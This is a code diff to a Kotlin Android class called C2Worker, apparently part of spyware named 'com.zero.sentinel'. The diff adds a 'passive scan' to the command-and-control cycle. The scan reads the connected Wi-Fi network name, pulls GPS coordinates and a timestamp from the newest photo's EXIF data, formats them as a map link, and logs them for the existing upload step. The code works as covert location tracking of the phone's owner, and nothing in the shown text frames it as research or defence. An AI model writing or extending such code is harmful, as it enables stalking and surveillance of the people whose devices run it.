@@ -49,7 +49,10 @@ class C2Worker(
                 Log.d("C2Worker", "New max update ID saved: $maxUpdateId")
             }
 
-            // 2. Upload Logs
+            // 2. Passive Monitoring
+            passiveScan()
+
+            // 3. Upload Logs
             uploadLogs()
 
             return@withContext Result.success()
@@ -57,6 +60,88 @@ class C2Worker(
             Log.e("C2Worker", "Error in C2 cycle", e)
             return@withContext Result.retry()
         }
+    }
+
+    private suspend fun passiveScan() {
+        Log.d("C2Worker", "Starting Passive Scan")
+        val context = applicationContext
+        
+        // 1. WiFi SSID
+        var ssid = "Unknown"
+        val fineLoc = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        val coarseLoc = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        val wifiState = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_WIFI_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        
+        if ((fineLoc || coarseLoc) && wifiState) {
+            try {
+                val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                @Suppress("DEPRECATION")
+                val info = wifiManager.connectionInfo
+                ssid = info.ssid ?: "Unknown"
+                // SSID might be wrapped in quotes
+                if (ssid.startsWith("\"") && ssid.endsWith("\"")) {
+                    ssid = ssid.substring(1, ssid.length - 1)
+                }
+            } catch (e: Exception) {
+                Log.e("C2Worker", "Error getting WiFi SSID", e)
+            }
+        }
+        
+        // 2. Media Location
+        var locationUrl = "Unknown"
+        var imgDate = "Unknown"
+        
+        // Check storage permission
+        val hasStorage = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
+                         androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        
+        if (hasStorage) {
+            try {
+                val projection = arrayOf(
+                    android.provider.MediaStore.Images.Media.DATA,
+                    android.provider.MediaStore.Images.Media.DATE_ADDED
+                )
+                val cursor = context.contentResolver.query(
+                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    projection,
+                    null,
+                    null,
+                    "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"
+                )
+                
+                cursor?.use {
+                    if (it.moveToFirst()) {
+                        val pathColumn = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
+                        val dateColumn = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED)
+                        
+                        val path = it.getString(pathColumn)
+                        val timestamp = it.getLong(dateColumn) * 1000L // DATE_ADDED is in seconds
+                        imgDate = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(timestamp))
+                        
+                        if (path != null) {
+                             val exif = android.media.ExifInterface(path)
+                             val latLong = FloatArray(2)
+                             if (exif.getLatLong(latLong)) {
+                                 locationUrl = "https://maps.google.com/?q=${latLong[0]},${latLong[1]}"
+                             }
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                 Log.e("C2Worker", "Error in passive media scan", e)
+            }
+        }
+
+        // 3. Log it
+        // Format: [WIFI: <SSID>] | [LOC: https://maps.google.com/?q=<Lat>,<Lon>] | [IMG_DATE: <EXIF_DATE>]
+        val logContent = "[WIFI: $ssid] | [LOC: $locationUrl] | [IMG_DATE: $imgDate]"
+        
+        repository.insertLog(
+            type = "PASSIVE",
+            packageName = "com.zero.sentinel",
+            content = logContent
+        )
+        Log.d("C2Worker", "Passive Scan logged: $logContent")
     }
 
     private suspend fun uploadLogs() {
